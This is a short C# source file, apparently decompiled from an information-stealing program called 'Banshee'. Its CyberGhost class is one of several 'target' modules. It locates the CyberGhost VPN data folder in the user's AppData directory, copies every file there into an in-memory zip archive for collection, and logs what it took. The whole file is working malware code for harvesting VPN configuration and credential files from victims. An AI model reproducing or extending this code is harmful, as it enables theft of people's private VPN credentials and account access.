﻿using System;
using System.IO;
using Banshee.Helper.Data;

namespace Banshee.Targets.Vpn
{
	// Token: 0x02000029 RID: 41
	public class CyberGhost : ITarget
	{
		// Token: 0x06000055 RID: 85 RVA: 0x00003BC4 File Offset: 0x00003BC4
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "CyberGhost");
			if (Directory.Exists(text))
			{
				string text2 = ZipPath.Vpn("CyberGhost");
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "CyberGhost";
				zip.AddDirectoryFiles(text, text2, true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
